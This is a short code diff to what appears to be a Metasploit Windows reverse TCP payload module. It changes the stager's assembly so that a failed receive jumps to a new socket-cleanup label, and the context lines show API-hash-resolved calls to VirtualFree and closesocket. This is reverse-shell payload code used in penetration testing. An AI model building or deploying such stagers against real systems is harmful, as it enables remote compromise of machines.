@@ -194,7 +194,7 @@ module Payload::Windows::ReverseTcp
         ; reliability: check to see if the recv worked, and reconnect
         ; if it fails
         cmp eax, 0
-        jle handle_connect_failure
+        jle cleanup_socket
       ^
     end
 
@@ -235,6 +235,7 @@ module Payload::Windows::ReverseTcp
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
         call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
 
+      cleanup_socket:
         ; clear up the socket
         push edi                ; socket handle
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
